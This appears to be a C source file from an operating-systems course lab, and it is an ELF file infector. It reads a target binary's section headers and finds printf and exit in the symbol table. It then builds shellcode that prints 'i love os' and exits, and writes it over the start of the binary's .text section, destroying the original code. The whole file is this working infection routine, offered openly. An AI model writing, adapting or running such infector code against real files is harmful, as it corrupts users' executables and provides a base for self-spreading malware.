#include "stdio.h"
#include "myelf.h"
#include "string.h"

int strncmp(char* a, char* b, int n) {
    int i = 0;
    for (i = 0; i < n; i++) {
        if (a[i] != b[i]) {
            return 1;
        }
    }
    return 0;
}

int is_elf(Elf32_Ehdr elf_ehdr) {
    // ELF文件头部的 e_ident 为 "0x7fELF"
    if ((strncmp(elf_ehdr.e_ident, ELFMAG, SELFMAG)) == 0)
        return 1;  // 是
    else
        return 0;  // 不是
}

void cal_addr(int entry, int addr[]) {
    int temp = entry;
    int i;
    for (i = 0; i < 4; i++) {
        addr[i] = temp % 256;  // 256 == 8byte
        temp /= 256;
    }
}
int main(int argc,char * argv[] )
{
    char * temp=argv[1]; 
    // ELF Header Table 结构体
    Elf32_Ehdr elf_ehdr;
    // Program Header Table 结构体
    Elf32_Shdr elf_shdr;
    Elf32_Sym elf_sym;
     if (strncmp(temp, "dev", 3) != 0 && strncmp(temp, "kernel.bin", 10) != 0) {  // 下面是感染过程
                // 不读驱动 不读kernel.bin
                int old_file = open(temp, O_RDWR);
                read(old_file, &elf_ehdr, sizeof(elf_ehdr));
                // 判断是否是一个 ELF 文件
                //printf("%s,", temp);
                if (is_elf(elf_ehdr)) {
                    //printf("it is a ELF , attacking\n");
                    int e_sho_off = elf_ehdr.e_shoff;
                    int section_num = elf_ehdr.e_shnum;
                    lseek(old_file, e_sho_off + sizeof(elf_shdr), SEEK_SET);
                    // 定位到text节的位置

                     //printf("%x %x\n",e_sho_off,sizeof(elf_shdr));
                    read(old_file, &elf_shdr, sizeof(elf_shdr));  //读出text table
                    int text_offset = elf_shdr.sh_offset;  // 找到代码段的偏移
                     //printf("%x\n",text_offset);

                    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 8, SEEK_SET);
                    read(old_file, &elf_shdr,sizeof(elf_shdr)); 
                    int str_offset =elf_shdr.sh_offset;  
                    
                     //printf("%x\n",str_offset);

                    char str_buf[1000];
                    lseek(old_file, str_offset, SEEK_SET);
                    read(old_file, str_buf, sizeof(str_buf));
                    
                    //printf("it is a ELF , attacking\n");
                    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 7, SEEK_SET);
                    read(old_file, &elf_shdr,sizeof(elf_shdr));
                    int sym_offset =elf_shdr.sh_offset;
                    // 此时已经在symbol table 位置 开始找printf
                    int sym_num =(str_offset-sym_offset) / 16;

                    // symbol_table项的个数

                    lseek(old_file, sym_offset, SEEK_SET);
                    
                   // printf("%x",e_sho_off + sizeof(elf_shdr) * 8);
                    int i = 0;
                    unsigned int printf_address, exit_address;
                    // 前者存储printf的文件中位置,
                    // 后者存储exit函数的文件中位置
                    int printf_flag = 0, exit_flag = 0;

                    for (i = 0; i < sym_num; i++) {
                        read(old_file, &elf_sym, sizeof(elf_sym));
                        

                        if (strcmp(str_buf + elf_sym.st_name, "printf") == 0) {
                            printf_flag = 1;
                            printf_address = elf_sym.st_value;
                             //printf("it is a ELF , attacking\n");
                        }
                        if (strcmp(str_buf + elf_sym.st_name, "exit") == 0) {
                            exit_flag = 1;
                            exit_address = elf_sym.st_value;
                           // printf("it is a ELF , attacking\n");
                        }
                        if (printf_flag && exit_flag) {
                            break;
                        }
                    }
                      //printf("it is a  , attacking\n");
                    if (i == sym_num) {
                        printf(
                            "not find printf or not find exit\n");
                    }

                    int printf_offset =
                        printf_address - (text_offset + 0x17);
                    int exit_offset = exit_address - (text_offset + 0x23);

                    int printf_off[4];
                    cal_addr(printf_offset, printf_off);

                    int exit_off[4];
                    cal_addr(exit_offset, exit_off);

                    int data_addr[4];
                    cal_addr(text_offset + 35, data_addr);

                    char shellcode[] = {
                        0x66,          0x87,
                        0xdb,                          // xchg bx,bx
                        0x89,          0xe5,           // mov ebp,esp
                        0x83,          0xe4,
                        0xf0,                          // and esp, 0xfffffff0
                        0x83,          0xec,
                        0x10,                          // sub esp, 0x00000010
                        0xc7,          0x04,          0x24,
                        data_addr[0],  data_addr[1],  data_addr[2],
                        data_addr[3],                 // mov ss[esp],string address
                        0xe8,          printf_off[0], printf_off[1],
                        printf_off[2],
                        printf_off[3],                 // call printf();
                        0xc7,          0x04,          0x24,
                        0x00,          0x00,          0x00,
                        0x00,                          // mov ss[esp],0
                        0xe8,          exit_off[0],   exit_off[1],
                        exit_off[2],
                        exit_off[3],                   // call exit();
                        0x69,          0x20,          0x6c,
                        0x6f,          0x76,          0x65,
                        0x20,          0x6f,          0x73,
                        0x0A,
                        0x00                          // string　"i love os"
                    };
                    lseek(old_file, text_offset, SEEK_SET);
                     //printf("it is a ELF , attacking\n");
                    write(old_file, shellcode, sizeof(shellcode));
                    printf("infecting successfully\n");
                } else {
                    printf(" it is not a ELF\n");
                }
            }
}
